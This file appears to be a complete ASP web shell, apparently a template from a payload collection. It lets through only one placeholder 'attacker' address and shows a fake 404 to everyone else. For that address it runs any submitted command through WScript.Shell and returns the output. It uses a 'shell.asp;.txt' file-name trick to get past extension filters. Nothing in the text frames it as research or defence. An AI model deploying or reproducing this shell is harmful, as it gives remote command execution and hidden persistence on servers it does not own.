<%
Server.ScriptTimeout = 180

ip=request.ServerVariables("REMOTE_ADDR")
if ip <> "VAR_ATTACKER_HOST" then
 response.Status="404 Page Not Found"
 response.Write(response.Status)
 response.End
end if

if Request.Form("submit") <> "" then
   Dim wshell, intReturn, strPResult
   cmd = Request.Form("cmd")
   Response.Write ("Running command: " & cmd & "<br />")
   set wshell = CreateObject("WScript.Shell")
   Set objCmd = wShell.Exec(cmd)
   strPResult = objCmd.StdOut.Readall()

   response.write "<br><pre>" & replace(replace(strPResult,"<","&lt;"),vbCrLf,"<br>") & "</pre>"

   set wshell = nothing
end if

%>
<html>
<head></head>
<body onload="document.shell.cmd.focus()">
<form action="shell.asp;.txt" method="POST" name="shell">
Command: <Input width="200" type="text" name="cmd" value="<%=cmd%>" /><br />
<input type="submit" name="submit" value="Submit" />
<p>Example command to do a directory listing:<br>
%ComSpec% /c dir
</form>
</body>
</html>
